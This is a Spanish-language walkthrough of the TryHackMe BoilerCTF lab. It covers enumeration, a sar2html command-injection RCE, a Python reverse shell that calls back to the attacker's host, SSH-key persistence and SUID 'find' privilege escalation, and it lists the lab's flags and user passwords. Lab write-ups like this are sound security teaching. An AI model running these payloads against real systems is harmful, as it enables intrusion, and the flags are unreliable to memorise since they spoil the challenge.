# BoilerCTF

`Try Hack Me` `Linux` `FTP` `CMS Joomla` `sar2html` `SUID` `find` `SSH` `RCE` `Shell Reversa`

## Flags

* **User Flag:** `You made it till here, well done`
* **Root Flag:** `It wasn't that hard, was it?`

## Users

* basterd _\(pwd: `superduperp@$$`\)_
* stoner _\(pwd: `superduperp@$$no1knows`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 21 \(FTP\) y 80 \(HTTP\), y luego el 10000 y el 55007.

![](https://i.imgur.com/ou4XCEB.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p21,80,10000,55007 IP`

![](https://i.imgur.com/Pm7V4IY.png)

> * Vemos que el servicio 80 es un Apache con un fichero http-robots.
> * El 10000 es un servicio web de Webmin httpd \(MiniServ 1.930\)
> * En el 55007 vemos el servicio SSH

### Servicio FTP

Probamos el acceso anónimo por FTP y funciona:

![](https://i.imgur.com/y6Ts0pq.png)

Dentro, de forma oculta, vemos un fichero **`.info.txt`** y nos lo traemos a nuestra máquina con **`mget .info.txt`**

![](https://i.imgur.com/T0HJolP.png)

> El fichero contiene un texto en **ROT13** pero es un trolleo

![](https://i.imgur.com/9eCrLmM.png)

### Servicio Webmin HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress en el servicio webmin: `whatweb IP:10000`

![](https://i.imgur.com/MGeGRvG.png)

Vemos que no tiene nada especial. Accedemos al portal web y vemos un mensaje de error.

![](https://i.imgur.com/PTj9VoF.png)

Nos indica que el servidor usa HTTPS. Accedemos a [https://IP:10000](https://IP:10000)

![](https://i.imgur.com/OT9nKXT.png)

Vemos un portal de login. Hacemos un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster**`gobuster dir -u https://IP:10000 -w DICT -q -n -e`

![](https://i.imgur.com/1Yoxh2X.png)

No funciona bien gobuster en este servicio.

### Servicio HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress en el servicio web: `whatweb IP`

![](https://i.imgur.com/DjdANaK.png)

Vemos que no tiene nada especial. Accedemos al portal web y vemos la página por defecto de apache. En el código fuente no hay nada.

Vamos a hacer un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster**`gobuster dir -u IP -w DICT -q -n -e`

```text
-u        Target 
-w         Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

![](https://i.imgur.com/cH4CpL9.png)

> Vemos que tiene un robots.txt. Lo vemos y parecen pistas, pero son troll:
>
> ![](https://i.imgur.com/ZslvhLz.png)
>
> ![](https://i.imgur.com/A1KyTwL.png)
>
> ![](https://i.imgur.com/ip3VjsW.png)

En Joomla vemos una especie de blog hecho con Joomla CMS.

![](https://i.imgur.com/787jqSK.png)

Lanzamos un fuzzing sobre Joomla:

`gobuster dir -u http://IP/joomla -w DICT -q -n -e`

![](https://i.imgur.com/oFjnYYC.png)

Vemos muchos paths por lo que parece claramente el CMS de Joomla. En **`IP/joomla/administrator`** vemos un login:

![](https://i.imgur.com/dG8yw3t.png)

Lanzamos un script de enumeración de joomla: **`joomscan -u httP://IP/joomla`**

{% embed url="https://tools.kali.org/web-applications/joomscan" caption="" %}

Con este, detectamos la versión de Joomla: **`3.9.12dev`**

![](https://i.imgur.com/cT3eVMr.png)

Buscamos en todos los paths que aparecen en el fuzzing, para ver que encontramos. En algunos paths vemos cosas pero de nuevo es troll.

## sar2html

En el path **`IP/joomla/_test`** encontramos algo que nos llama la atención:



![](https://i.imgur.com/56DGzIE.png)

Buscamos información sobre **`sar2html`** y encontramos exploits enseguida:

{% embed url="https://www.exploit-db.com/exploits/47204" caption="" %}

Vemos que el exploit permite RCE mediante un parámetro de la URL:

**`IP/joomla/_test/index.php?plot=;COMMAND`**

Lo probamos y funciona

![](https://i.imgur.com/rUiUUBV.png)

## **Getting a shell**

Podemos ganar acceso a la máquina introduciendo una shell reversa en el parámetro de la URL:

```text
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Lo probamos y funciona, tenemos acceso a la máquina como el usuario **www-data**.

![](https://i.imgur.com/MGL7tHz.png)

### Switch user

Con este usuario no podemos encontrar la flag, necesitamos acceder con otro usuario.

Vemos que en el directorio actual hay un fichero **`log.txt`** que contiene un usuario y una password.

![](https://i.imgur.com/BTVWH7g.png)

{% hint style="warning" %}
Tenemos un usuario **`basterd`** y su password **`superduperp@$$`**
{% endhint %}

Accedemos con este usuario con **`su basterd`**.

{% hint style="danger" %}
Podemos tener acceso sin contraseña copiando nuestra Clave Pública SSH

```bash
#ON MACHINE
cd
mkdir -p ~/.ssh
echo "[MY LOCAL ~/.ssh/id_rsa.pub]" >> ~/.ssh/authorized_keys

#ON KALI
ssh -i ~/.ssh/id_rsa USER@IP
```
{% endhint %}

![](https://i.imgur.com/jZNqu38.png)

Vemos que en el directorio tampoco esta la flag, por lo que necesitamos cambiar al otro usuario que vemos en /home: **`stoner`**

![](https://i.imgur.com/jpIKzdD.png)

Hay un script **`backup.sh`**, propiedad de **`stoner`**, y dentro podemos ver lo que parece su contraseña.

{% hint style="warning" %}
Tenemos un usuario **`stoner`** y su password **`superduperp@$$no1knows`**
{% endhint %}

### **User Flag**

![](https://i.imgur.com/vtP8q3Q.png)

Podemos acceder como **`stoner`** con **`su stoner`**

{% hint style="danger" %}
De nuevo, podemos acceder sin contraseña copiando nuestra clave privada SSH.
{% endhint %}

En el directorio home de stoner vemos la flag, que está oculta en el fichero **`.secret`**.

{% hint style="success" %}
USER FLAG: **`You made it till here, well done`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script ](https://github.com/rebootuser/LinEnum)para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario **stoner** y **basterd** con el comando `sudo -l`.

![](https://i.imgur.com/VXpW3tO.png)

![](https://i.imgur.com/5rCjO4C.png)

> Uno es troll y el otro no puede ejecutar el comando

Buscamos los ficheros con el SUID activo.

```text
find / -user root -perm -4000 2>/dev/null
```

![](https://i.imgur.com/Bnnl0jt.png)

Podemos buscar alguno que nos llame la atención de esta guía

{% embed url="https://gtfobins.github.io/" caption="" %}

Nos llama la atencion **`/usr/bin/find`**. Vemos que aparece en GTFOBINS:

{% embed url="https://gtfobins.github.io/gtfobins/find/" caption="" %}

![](https://i.imgur.com/KrIkdHo.png)

Lanzamos lo siguiente:

```text
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![](https://i.imgur.com/qQz835I.png)

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la **root.txt** flag.

{% hint style="success" %}
ROOT FLAG: **`It wasn't that hard, was it?`**
{% endhint %}

